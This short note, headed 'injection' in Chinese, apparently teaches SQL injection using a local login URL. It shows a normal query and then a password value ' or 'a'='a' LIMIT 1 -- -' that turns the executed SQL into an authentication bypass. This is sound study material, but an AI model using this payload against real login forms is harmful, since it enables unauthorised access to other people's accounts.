## 注入

----

```
http://127.0.0.1:3000/login?username=zhangsan&password=123
```

Executed SQL: 
```sql
SELECT `id`, `name`, `pass`, `description`, `role_id` 
FROM `user` 
WHERE `name` = 'zhangsan' AND `pass` = '123'
```

```
http://127.0.0.1:3000/login?username=zhangsan&password=11' or 'a'='a' LIMIT 1 -- -'
```

Executed SQL:
```
SELECT `id`, `name`, `pass`, `description`, `role_id` 
FROM `user` 
WHERE `name` = 'zhangsan' AND `pass` = '11' or 'a'='a' LIMIT 1 -- -'
```